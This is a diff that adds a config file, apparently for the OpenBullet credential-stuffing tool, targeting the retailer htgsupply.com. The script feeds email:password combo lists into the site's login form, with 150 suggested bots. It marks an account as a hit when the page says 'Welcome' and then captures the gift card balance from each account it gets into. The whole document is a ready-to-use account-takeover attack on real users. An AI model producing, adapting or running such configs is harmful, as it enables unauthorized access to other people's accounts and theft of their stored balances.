@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "HTG-Supply",
+  "SuggestedBots": 150,
+  "LastModified": "2018-08-09T14:07:23.0747031+00:00",
+  "AdditionalInfo": "Checks accounts for access + giftcard balance if on file. ",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#PARSE_RETURNURL PARSE "<SOURCE>" CSS "[name=ReturnUrl]" "value" 0 -> VAR "RETURNURL" "" "" 
+#GET_LOGIN_PAGE REQUEST GET "https://www.htgsupply.com/Account/LogOn" AutoRedirect=TRUE 
+  CONTENT "Email=<USER>&ReturnUrl=%2FAccount&Password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "cookies: ARRAffinity=a7563005620da0c8b8f9c02eaaa2b3b941236c81a620e9478b4853eb1c8fdbe5" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#POST_LOGIN REQUEST POST "https://www.htgsupply.com/Account/LogOn" AutoRedirect=TRUE 
+  CONTENT "Email=<USER>&ReturnUrl=%2FAccount&Password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "cookies: ARRAffinity=a7563005620da0c8b8f9c02eaaa2b3b941236c81a620e9478b4853eb1c8fdbe5" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "unsuccessful" 
+  KEYCHAIN Success OR 
+    KEY "Welcome" 
+#GET_LOGIN_PAGE REQUEST GET "https://www.htgsupply.com/Account/GiftCards" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_RETURNURL PARSE "<SOURCE>" LR "frmGiftCard\"" "\"" Recursive=FALSE -> CAP "Current account balance " "" "" 
+#POST_LOGIN REQUEST POST "https://www.htgsupply.com/Account/GiftCards/Account/LogOn" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "card" 
